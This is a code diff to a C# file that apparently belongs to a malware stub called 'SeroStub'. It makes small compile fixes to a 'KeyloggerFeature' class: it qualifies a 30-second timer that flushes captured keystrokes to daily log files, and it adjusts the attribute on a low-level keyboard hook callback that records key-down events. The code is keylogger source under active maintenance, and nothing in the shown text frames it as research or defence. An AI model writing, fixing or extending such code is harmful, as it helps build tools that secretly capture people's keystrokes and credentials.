@@ -1,6 +1,5 @@
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Timers;
 
 namespace SeroStub;
 
@@ -40,7 +39,7 @@ internal static class KeyloggerFeature
         Path.Combine(_logDir, DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
 
     // Flush in-memory buffer to disk every 30 seconds
-    private static readonly Timer _flushTimer = new(30_000) { AutoReset = true };
+    private static readonly System.Timers.Timer _flushTimer = new(30_000) { AutoReset = true };
 
     static KeyloggerFeature()
     {
@@ -168,7 +167,7 @@ internal static class KeyloggerFeature
         _hook = nint.Zero;
     }
 
-    [System.Runtime.CompilerServices.UnmanagedCallersOnly]
+    [UnmanagedCallersOnly]
     private static nint HookProc(int nCode, nint wParam, nint lParam)
     {
         if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
